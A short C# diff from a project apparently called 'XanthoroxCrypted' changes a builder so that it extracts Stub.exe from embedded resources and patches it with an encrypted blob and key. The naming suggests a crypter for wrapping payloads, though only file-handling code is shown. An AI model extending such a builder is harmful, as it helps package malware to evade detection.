@@ -1,6 +1,7 @@
 using Microsoft.Win32;
 using System;
 using System.IO;
+using System.Reflection;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -255,16 +256,30 @@ namespace XanthoroxCrypted.Views
                         });
                     }
 
-                    // Patch stub
-                    string appDir = AppDomain.CurrentDomain.BaseDirectory;
-                    string stubPath = Path.Combine(appDir, "..", "Stub", "Stub.exe");
-                    if (!File.Exists(stubPath))
-                        stubPath = Path.Combine(appDir, "Stub.exe");
+                    // Extract embedded stub from resources
+                    byte[] stubData;
+                    var assembly = Assembly.GetExecutingAssembly();
+                    using (var stream = assembly.GetManifestResourceStream("XanthoroxCrypted.Stub.exe"))
+                    {
+                        if (stream == null)
+                            return "ERR: Embedded Stub.exe resource not found.";
+                        stubData = new byte[stream.Length];
+                        int offset = 0;
+                        while (offset < stubData.Length)
+                        {
+                            int read = stream.Read(stubData, offset, stubData.Length - offset);
+                            if (read == 0) break;
+                            offset += read;
+                        }
+                    }
 
+                    string appDir = AppDomain.CurrentDomain.BaseDirectory;
                     string outputDir = Path.Combine(appDir, "..", "Output");
+                    if (!Directory.Exists(outputDir))
+                        Directory.CreateDirectory(outputDir);
                     string outputPath = Path.Combine(outputDir, outputName);
 
-                    string err = StubPatcher.Build(stubPath, outputPath, encrypted, key, config, researchParams);
+                    string err = StubPatcher.Build(stubData, outputPath, encrypted, key, config, researchParams);
                     if (!string.IsNullOrEmpty(err))
                         return "ERR: " + err;
 
